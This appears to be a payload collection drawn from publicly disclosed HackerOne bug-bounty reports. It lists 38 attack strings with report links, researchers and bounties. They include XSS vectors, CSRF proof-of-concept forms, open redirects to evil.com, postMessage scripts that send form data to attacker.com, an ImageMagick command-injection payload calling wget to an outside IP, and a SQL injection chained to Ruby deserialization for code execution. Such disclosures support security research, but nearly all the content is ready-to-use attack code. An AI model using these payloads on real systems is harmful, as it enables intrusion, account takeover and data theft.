# HackerOne

38 payloads.

### `cead62d3`

```
<http://\<img\ style=\"display:none\"\ src=0\ onerror=\"alert(\'Uh\ oh\')\"\>>
```

— [Vulnerability with the way \ escaped characters in <http://target.com> style links are rendered](https://hackerone.com/reports/46072) · HackerOne · [danlec](https://hackerone.com/danlec) · $5,000.0

### `cec0693f`

```
http://\<img\
```

— [Vulnerability with the way \ escaped characters in <http://target.com> style links are rendered](https://hackerone.com/reports/46072) · HackerOne · [danlec](https://hackerone.com/danlec) · $5,000.0

### `6b9a7472`

```
<form method="POST" action="https://target.com/danlec-test/team_members"
     target="_blank">
  <input type="text" name="authenticity_token" 
     value="authenticity_token from the POST to this page">
  <input type="text" name="invitations_team_member[email]" 
     value="attacker@gmail.com">
  <input type="hidden" name="team_member[add_as_manager]" value="1">
  <input type="hidden" name="utf8" value="✓">
  <input type="hidden" name="commit" value="Send invite">
  <input type="submit">
</fo
```

— [CSP Bypass: Click handler for links with data-method="post" can cause authenticity_token to be sent off domain](https://hackerone.com/reports/47472) · HackerOne · [danlec](https://hackerone.com/danlec) · $2,000.0

### `e7096fb2`

```
$.ajax({ 
  url: "https://target.com/reports/bulk", 
  method: 'post', 
  contentType: "application/json", 
  data: JSON.stringify({ 
    state: "open", 
    substate: "triaged", 
    report_ids: [… id of the report …], 
    reply_action: "change-state", 
    reference: {
      _isReactElement: true,
      _store: {},
      type:"body",
      props: {
        dangerouslySetInnerHTML: {
          __html:
            "<h1>Arbitrary HTML</h1><script>alert('No CSP Support :(')</script>"
        }
```

**Parameter:** `reference`
— [Improperly validated fields allows injection of arbitrary HTML via spoofed React objects](https://hackerone.com/reports/49652) · HackerOne · [danlec](https://hackerone.com/danlec) · $5,000.0

### `f70de4ea`

```
https://target.com//example.com/ru/faq
```

— [Open redirect in "Language change".](https://hackerone.com/reports/52035) · HackerOne · [seifelsallamy](https://hackerone.com/seifelsallamy) · $500.0

### `efd9cf42`

```
https://target.com//example.com/faq
```

— [Open redirect in "Language change".](https://hackerone.com/reports/52035) · HackerOne · [seifelsallamy](https://hackerone.com/seifelsallamy) · $500.0

### `03b9b28f`

```
https://target.com//example.com/disclosure-guidelines
```

— [Open redirect in "Language change".](https://hackerone.com/reports/52035) · HackerOne · [seifelsallamy](https://hackerone.com/seifelsallamy) · $500.0

### `1154b1cc`

```
https://target.com//example.com/ru/disclosure-guidelines
```

— [Open redirect in "Language change".](https://hackerone.com/reports/52035) · HackerOne · [seifelsallamy](https://hackerone.com/seifelsallamy) · $500.0

### `6a001860`

```
https://target.com//target.com
```

— [Open-redirect on target.com](https://hackerone.com/reports/57163) · HackerOne · [abze](https://hackerone.com/abze)

### `b42690e1`

```
https://target.com//evil.com
```

— [Open-redirect on target.com](https://hackerone.com/reports/57163) · HackerOne · [abze](https://hackerone.com/abze)

### `0af56550`

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
pop graphic-context
```

— [RCE in profile picture upload](https://hackerone.com/reports/135072) · HackerOne · [c666a323be94d57](https://hackerone.com/c666a323be94d57)

### `bddb6f8e`

```
<html>
<body>
	<iframe id="login_csrf_frame" src="████████" style="width:0;height:0;border:0;border:none;"></iframe>
	<script>
		setTimeout(function(){document.location.href = "https://target.com/users/saml/sign_in?email=████&remember_me=true";}, 5000);
	</script>
</body>
</html>
```

— [(HackerOne SSO-SAML) Login CSRF, Open Redirect, and Self-XSS Possible Exploitation](https://hackerone.com/reports/171398) · HackerOne · [whhackersbr](https://hackerone.com/whhackersbr)

### `f5823d87`

```
<img src='https://target.com/steal_csrf_token?html=
```

— [Google Analytics could be used as CSP bypass for data exfiltration on target.com](https://hackerone.com/reports/199779) · HackerOne · [aaron_costello](https://hackerone.com/aaron_costello)

### `4d95d9ec`

```
<img src='https://target.com/steal_csrf_token?html=
<form action="https://evil.com/poc">

<input type="hidden" name="csrf_token" value="some_csrf_token_value">
</form>
```

— [Google Analytics could be used as CSP bypass for data exfiltration on target.com](https://hackerone.com/reports/199779) · HackerOne · [aaron_costello](https://hackerone.com/aaron_costello)

### `b0cbfc1c`

```
<img src='https://target.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=
<p>secret</p>
```

— [Google Analytics could be used as CSP bypass for data exfiltration on target.com](https://hackerone.com/reports/199779) · HackerOne · [aaron_costello](https://hackerone.com/aaron_costello)

### `24729fc1`

```
<?
header("Access-Control-Allow-Origin: *");
?>
alert(document.domain)
```

— [Stealing contact form data on target.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) · HackerOne · [fransrosen](https://hackerone.com/fransrosen)

### `231dee0b`

```
<iframe id="x" name="x" border="0" frameborder="0" width="100" height="30" src="https://target.com/index.php/form/XDFrame"></iframe>
```

— [Stealing contact form data on target.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) · HackerOne · [fransrosen](https://hackerone.com/fransrosen)

### `79cb4c2f`

```
<script>
var run = false
var b
window.onmessage=function() {
	if(!run)
	x.postMessage('{"mktoRequest":{"ajaxParams":{"url":"https://attacker.com/jsonp.php","dataType":"jsonp","method":"get"}}}', '*')
	run = true
}
</script>
```

— [Stealing contact form data on target.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) · HackerOne · [fransrosen](https://hackerone.com/fransrosen)

### `b555cd2f`

```
<?
header("Access-Control-Allow-Origin: *");
?>
(function(){
document.body.innerHTML='<a href="#" onclick="window.b=window.open(\'https://target.com/product/overview#contact\',\'b\',\'\')">Click me!</a>'

setInterval(function() {
try {
	b['frames'][0].postMessage('{"mktoRequest":{"ajaxParams":{"url":"https://attacker.com/jsonp2.php","dataType":"jsonp","method":"get"}}}', '*')
} catch(e){}
}, 1000);
})()
```

— [Stealing contact form data on target.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) · HackerOne · [fransrosen](https://hackerone.com/fransrosen)

### `500ffb11`

```
<?
header("Access-Control-Allow-Origin: *");
?>
(function(){
	if(window.icanhazmsg) return
	window.icanhazmsg=true
	window.onmessage=function(a) {
		if(a.origin.indexOf('marketo') !== -1) return;
		console.log(a);
		alert("I HAVE YOUR DATA NOW\n" + a.data)
	}
})()
```

— [Stealing contact form data on target.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) · HackerOne · [fransrosen](https://hackerone.com/fransrosen)

### `d25517f2`

```
pid=123&issue_type=1&base_url=javascript://alert(1)%3B@&summary={{title}}&description={{details_truncated}}+{{1+1}}+#{1+1}&labels=HackerOne&assignee=&custom=test=1
```

**Parameter:** `base_url`
— [IE 11 Self-XSS on Jira Integration Preview Base Link](https://hackerone.com/reports/212721) · HackerOne · [ziot](https://hackerone.com/ziot) · $750.0

### `ee9d6604`

```
javascript://alert(document.domain);%2f%2f@
```

**Parameter:** `base_url`
— [IE 11 Self-XSS on Jira Integration Preview Base Link](https://hackerone.com/reports/212721) · HackerOne · [ziot](https://hackerone.com/ziot) · $750.0

### `b0b531ad`

```
url=JAVASCRIPT:some-payload
```

**Parameter:** `url`
— [Query parameter reordering causes redirect page to render unsafe URL](https://hackerone.com/reports/293689) · HackerOne · [kenziy](https://hackerone.com/kenziy) · $1,500.0

### `d985b29e`

```
http://username@domain.com
```

— [Domain spoofing in redirect page using RTLO](https://hackerone.com/reports/299403) · HackerOne · [ashish_r_padelkar](https://hackerone.com/ashish_r_padelkar)

### `a9289b24`

```
[Just Click Here](https://target.com@%E2%80%AE@moc.rettiwt)
```

— [Domain spoofing in redirect page using RTLO](https://hackerone.com/reports/299403) · HackerOne · [ashish_r_padelkar](https://hackerone.com/ashish_r_padelkar)

### `1ef245f7`

```
https://target.com@%E2%80%AE@moc.rettiwt
```

— [Domain spoofing in redirect page using RTLO](https://hackerone.com/reports/299403) · HackerOne · [ashish_r_padelkar](https://hackerone.com/ashish_r_padelkar)

### `13feb5e1`

```
https://target.com/users/confirmation?confirmation_token=z2-aaa&invitation_token=/../../test
```

**Parameter:** `invitation_token`
— [Path traversal leading to limited CSRF on GET requests on two endpoints](https://hackerone.com/reports/301862) · HackerOne · [kapytein](https://hackerone.com/kapytein)

### `4a7711b1`

```
https://target.com/users/password/new?invitation_token=/../../test
```

**Parameter:** `invitation_token`
— [Path traversal leading to limited CSRF on GET requests on two endpoints](https://hackerone.com/reports/301862) · HackerOne · [kapytein](https://hackerone.com/kapytein)

### `5dcc0be2`

```
<html>
<head>
<script>
function calculate_load_times() {
  // Check performance support
  if (performance === undefined) {
    console.log("= Calculate Load Times: performance NOT supported");
    return;
  }

  // Get a list of "resource" performance entries
  var resources = performance.getEntriesByType("resource");
  if (resources === undefined || resources.length <= 0) {
    console.log("= Calculate Load Times: there are NO `resource` performance records");
    return;
  }

  console.log("= 
```

— [Timing attack towards endpoints on the web without CSRF ](https://hackerone.com/reports/348168) · HackerOne · [b258ea62bf297b02afa9854](https://hackerone.com/b258ea62bf297b02afa9854)

### `f7fb273f`

```
{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"javascript:alert(document.domain);//","aliId":17144124}}}
```

— [DOM Based XSS in target.com via PostMessage](https://hackerone.com/reports/398054) · HackerOne · [adac95](https://hackerone.com/adac95) · $500.0

### `d4828655`

```
https://target.com/careers?lever-#aaa"><script src="https://evil.com/index.php/form/getForm?callback=alert"></script>
```

**Parameter:** `lever`
— [Cross-site Scripting (XSS) on HackerOne careers page](https://hackerone.com/reports/474656) · HackerOne · [nguyenlv7](https://hackerone.com/nguyenlv7) · $500.0

### `2a420945`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://target.com/users/sign_in" method="POST">
      <input type="hidden" name="user[email]" value="youremail" />
      <input type="hidden" name="user[password]" value="yourpassword" />
      <input type="hidden" name="user[remember_me]" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

— [Login CSRF vulnerability on target.com](https://hackerone.com/reports/834366) · HackerOne · [what_web](https://hackerone.com/what_web) · $500.0

### `aa68223f`

```
<script src="//target.com/1.8.0/angular.js"></script>
<div ng-app>
  <img
    src="/"
    ng-on-error="$event.srcElement.ownerDocument.defaultView.alert($event.srcElement.ownerDocument.domain)"
  />
</div>
```

**Parameter:** `__proto__.innerHTML`
— [Reflected XSS on target.com via Wistia embed code](https://hackerone.com/reports/986386) · HackerOne · [vakzz](https://hackerone.com/vakzz) · $500.0

### `a3616d96`

```
http://target.com/redirect?url=https://evil.com
```

**Parameter:** `url`
— [Open Redirect on http://target.com/redirect?url=https://evil.com](https://hackerone.com/reports/1028345) · HackerOne · [nagli](https://hackerone.com/nagli)

### `9df0635c`

```
'"><img src=x id=█████ onerror=eval(atob(this.id))>
```

— [Blind XSS in target.com/████████ via /reviews/ratings/{uuid}](https://hackerone.com/reports/1558010) · HackerOne · [bugra](https://hackerone.com/bugra)

### `2b23c485`

```
SELECT
        1
;

ROLLBACK
;

INSERT
    INTO
        user_versions (
            item_type
            ,item_id
            ,event
            ,email
            ,object
        )
    VALUES (
        'User'
        ,2
        ,'update'
        , 'uniquekeywordtotriggercode@hackerone.com'
        ,'---
username:
  - !ruby/object:Gem::Installer
      i: x
  - !ruby/object:Gem::SpecFetcher
      i: y
  - !ruby/object:Gem::Requirement
    requirements:
      !ruby/object:Gem::Package::TarReader

```

— [Ability to escape database transaction through SQL injection, leading to arbitrary code execution](https://hackerone.com/reports/1663299) · HackerOne · [jobert](https://hackerone.com/jobert)

### `29345255`

```
PUT /reports/████/summaries/███████ HTTP/2
Host: target.com
.....all header ...
Content-Length: 908
Origin: https://target.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"id":████████,"category":"researcher","content":"TESTEDIT\n\n{F3155244} ","updated_at":"2024-03-30T17:16:29.625Z","user":{"id":█████,"username":"█████","name":"██████████████","bio":"please see pdfx","cleared":false,"verified":false,"website":null,"location":"","created_at":"2024-
```

**Parameter:** `path`
— [Attachment disclosure via summary report ](https://hackerone.com/reports/2442008) · HackerOne · [xklepxn](https://hackerone.com/xklepxn)

### `5f450049`

```
GET /reports/<the-report-id-here>.json HTTP/2
Host: target.com
Sec-Ch-Ua-Mobile: ?0
X-Datadog-Origin: rum
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
X-Datadog-Sampling-Priority: 1
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
X-Datadog-Parent-Id: 578794727646244533
X-Datadog-Trace-Id: 180506980422927885
Sec-Ch-Ua-Platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fe
```

— [Private data related to program exposed via /reports/<id>.json endpoint to external user participant](https://hackerone.com/reports/2580982) · HackerOne · [saurabhb](https://hackerone.com/saurabhb)
